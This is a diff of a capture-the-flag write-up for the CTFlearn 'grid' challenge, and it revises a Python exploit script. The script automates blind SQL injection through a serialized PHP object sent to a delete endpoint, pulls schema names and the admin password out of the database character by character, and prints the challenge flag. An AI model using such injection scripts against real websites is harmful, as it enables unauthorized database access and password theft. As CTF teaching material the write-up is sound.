@@ -85,19 +85,18 @@ Now we just need to fetch admin's password and we can do so by executing the fol
 ### Flag
 After logging in into admin's account, we are given the flag: `ctflearn{obj3ct_inj3ct1on}` whose name is very confusing, because it wasn't an object injection at all, just some simple object modification!
 
-### Python3 exploit
+### Python exploit
 A bit complicated, but friendly to use, exploit created to solve the task
 ```python
-import requests
-import urllib
-import re
-
+import requests, urllib, re, sys
 
 url_base = "http://web.ctflearn.com/grid/controller.php"
 url_login= url_base+"?action=login"
 url_debug= url_base+"?action=debug"
 url_delete= url_base+"?action=delete_point&point="
 url_addpoint = url_base+"?action=add_point"
+
+sessid = requests.Session()
 
 payload_base = 'O:5:"point":1:{s:2:"ID";s:@LENGTH@:"@QUERY@";};'
 init_array = []
@@ -115,12 +114,13 @@ columns_user_payload = "@ID@ AND Ascii(substring((SELECT column_name FROM inform
 columns_point_payload = "@ID@ AND Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'point' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
 
 def printInPlace(alert):
-	if fancy_console: 
-		print(alert, end="\b"*len(alert), flush=True)
+	if fancy_console:
+		sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
+		sys.stdout.flush();
 	return fancy_console
 
 def isLogged():
-	debug = requests.get(url_debug, cookies=sessid)
+	debug = sessid.get(url_debug)
 	i = debug.text.find("[user]")
 	return False if i==-1 else True
 
@@ -130,14 +130,12 @@ def createPayload( query ):
 def sendPayload ( query ):
 	if sillent == False: print ("exec: WHERE ID= {}".format(query))
 	payload = createPayload(query)
-	delete = requests.get(url_delete+payload, cookies=sessid)
+	delete = sessid.get(url_delete+payload)
 	return findIDs(delete.text)
 
 def logIn(login_info):
-	global sessid
 	print ("loggin in: ", login_info)
-	login = requests.post(url_login, data=login_info, allow_redirects=False)
-	sessid = login.cookies.copy()
+	sessid.post(url_login, data=login_info, allow_redirects=False)
 	return
 
 def findIDs(text):
@@ -151,7 +149,7 @@ def addPoints():
 		print("[[Adding points]]")
 	for x in range(1, 30):
 		point = {'x': 0, 'y': 0}
-		requests.post(url_addpoint, data=point, cookies=sessid, allow_redirects=False)
+		sessid.post(url_addpoint, data=point, allow_redirects=False)
 	printInPlace(" "*len(alert))
 	return
 
@@ -189,7 +187,8 @@ def findNames(payload, alphabet):
 			pl2 = pl.replace("@wOFFSET@", str(word_offset))
 			c = findName(pl2, alphabet)
 			if c == alphabet[0]: break
-			print(c, end='', flush=True)
+			sys.stdout.write(c)
+			sys.stdout.flush
 			result+=c
 		print(" ")
 		if len(result) <= 1: break
